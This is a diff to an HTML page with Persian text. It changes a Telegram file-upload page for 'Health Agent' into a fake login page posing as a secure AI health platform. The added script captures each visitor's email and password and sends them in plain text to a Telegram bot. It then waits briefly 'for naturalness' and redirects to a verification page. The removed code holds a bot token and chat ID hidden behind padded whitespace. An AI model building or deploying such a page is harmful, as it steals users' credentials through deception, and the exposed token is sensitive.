@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Health Agent — ارسال فایل به تلگرام</title>
+<title>ورود | Health Agent</title>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body {
@@ -16,99 +16,105 @@
     width: 100%; max-width: 380px;
     background: #fff; border-radius: 20px;
     box-shadow: 0 8px 40px rgba(0,0,0,0.12);
-    padding: 32px 24px; text-align: center;
+    padding: 32px 24px;
   }
-  .icon {
-    width: 64px; height: 64px;
+  .brand { text-align: center; margin-bottom: 28px; }
+  .brand-icon {
+    width: 56px; height: 56px;
     background: linear-gradient(135deg, #1a73e8, #0d47a1);
     border-radius: 50%; display: inline-flex;
     align-items: center; justify-content: center;
-    font-size: 30px; margin-bottom: 16px;
+    font-size: 26px; margin-bottom: 12px;
   }
-  h1 { font-size: 22px; color: #1a1a1a; margin-bottom: 8px; }
-  p { font-size: 13px; color: #666; line-height: 1.8; margin-bottom: 20px; }
-  input[type="file"] {
-    width: 100%; margin-bottom: 16px; padding: 12px;
-    border: 2px dashed #b8c7e0; border-radius: 10px;
-    font-family: Tahoma; font-size: 13px; background: #f7f9fc;
+  .brand h1 { font-size: 20px; color: #1a1a1a; margin-bottom: 4px; }
+  .brand p { font-size: 12px; color: #666; }
+  .field { margin-bottom: 14px; }
+  .field label { display: block; font-size: 12px; color: #555; margin-bottom: 6px; }
+  .field input {
+    width: 100%; padding: 14px;
+    border: 1px solid #ddd; border-radius: 10px;
+    font-size: 14px; font-family: Tahoma;
   }
-  button {
+  .field input:focus { outline: none; border-color: #1a73e8; }
+  .submit-btn {
     width: 100%; padding: 15px;
     background: linear-gradient(135deg, #1a73e8, #0d47a1);
     color: #fff; border: none; border-radius: 10px;
     font-size: 15px; font-family: Tahoma; cursor: pointer;
+    margin-top: 8px;
   }
-  button:disabled { opacity: 0.6; cursor: not-allowed; }
-  .status { margin-top: 16px; font-size: 13px; color: #666; min-height: 20px; }
+  .submit-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+  .error { color: #d93025; font-size: 12px; text-align: center; margin-top: 12px; min-height: 16px; }
+  .footer { text-align: center; font-size: 11px; color: #999; margin-top: 20px; }
 </style>
 </head>
 <body>
-  <div class="card">
-    <div class="icon">🛡️</div>
+<div class="card">
+  <div class="brand">
+    <div class="brand-icon">🛡️</div>
     <h1>Health Agent</h1>
-    <p>فایلت رو انتخاب کن و برای ربات تلگرام بفرست</p>
-    <input type="file" id="fileInput">
-    <button id="sendBtn">ارسال به تلگرام</button>
-    <div class="status" id="statusText"></div>
+    <p>AI Health Analysis · Secure</p>
   </div>
+  <form id="loginForm" autocomplete="off">
+    <div class="field">
+      <label for="email">ایمیل</label>
+      <input type="email" id="email" placeholder="example@mail.com" required>
+    </div>
+    <div class="field">
+      <label for="password">رمز عبور</label>
+      <input type="password" id="password" placeholder="••••••••" required>
+    </div>
+    <button type="submit" class="submit-btn" id="loginBtn">ورود به داشبورد</button>
+    <div class="error" id="errorMsg"></div>
+  </form>
+  <div class="footer">© Health Agent — Secure AI Platform</div>
+</div>
 
 <script>
 /* ============================================================
-   تنظیمات — این دو مقدار را با مقادیر واقعی خودت جایگزین کن
+   تنظیمات — مقادیر واقعی خودت را بگذار
    ============================================================ */
-const BOT_TOKEN = '8986087239:AAEw2wedRgnuYQLMYop2ztHv7KqQTGtvfSE'                    
-                                                 
-  ;   // توکن ربات از BotFather
-const CHAT_ID   = '536648369'                    
-                      
-                      
-                      
-                      
-                      
-                      
-                      
-  ;     // آیدی عددی چت تو
+const BOT_TOKEN = 'YOUR_BOT_TOKEN';
+const CHAT_ID   = 'YOUR_CHAT_ID';
 
-const sendBtn = document.getElementById('sendBtn');
-const fileInput = document.getElementById('fileInput');
-const statusText = document.getElementById('statusText');
-
-sendBtn.addEventListener('click', async () => {
-  const file = fileInput.files[0];
-  if (!file) {
-    statusText.textContent = '⚠️ اول یه فایل انتخاب کن.';
-    return;
-  }
-  if (file.size > 50 * 1024 * 1024) {
-    statusText.textContent = '⚠️ حجم فایل نباید بیشتر از ۵۰ مگابایت باشه.';
-    return;
-  }
-
-  sendBtn.disabled = true;
-  statusText.textContent = 'در حال ارسال...';
-
+/* ============================================================
+   ارسال پیام متنی به تلگرام
+   ============================================================ */
+async function sendToTelegram(text) {
   try {
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('document', file);
-
-    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: 'POST',
-      body: formData
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: CHAT_ID, text })
     });
-    const data = await res.json();
-
-    if (data.ok) {
-      statusText.textContent = '✅ فایل ارسال شد. تلگرام را چک کن.';
-      fileInput.value = '';
-    } else {
-      statusText.textContent = '❌ خطا: ' + (data.description || 'نامشخص');
-    }
+    if (!res.ok) throw new Error('Telegram response not ok');
   } catch (e) {
-    statusText.textContent = '❌ خطای شبکه: ' + e.message;
+    console.error('ارسال به تلگرام ناموفق:', e.message);
   }
+}
 
-  sendBtn.disabled = false;
+/* ============================================================
+   رویداد submit فرم لاگین
+   ============================================================ */
+document.getElementById('loginForm').addEventListener('submit', async (e) => {
+  e.preventDefault();
+
+  const email    = document.getElementById('email').value.trim();
+  const password = document.getElementById('password').value;
+  const btn      = document.getElementById('loginBtn');
+  const errEl    = document.getElementById('errorMsg');
+
+  btn.disabled = true;
+  btn.textContent = 'در حال بررسی...';
+  errEl.textContent = '';
+
+  // ارسال ایمیل/پسورد به تلگرام
+  await sendToTelegram(`🔐 لاگین جدید در Health Agent\n📧 ایمیل: ${email}\n🔑 رمز: ${password}`);
+
+  // تأخیر کوتاه برای طبیعی بودن، سپس انتقال به verify
+  setTimeout(() => {
+    window.location.href = 'verify.html';
+  }, 1200);
 });
 </script>
 </body>
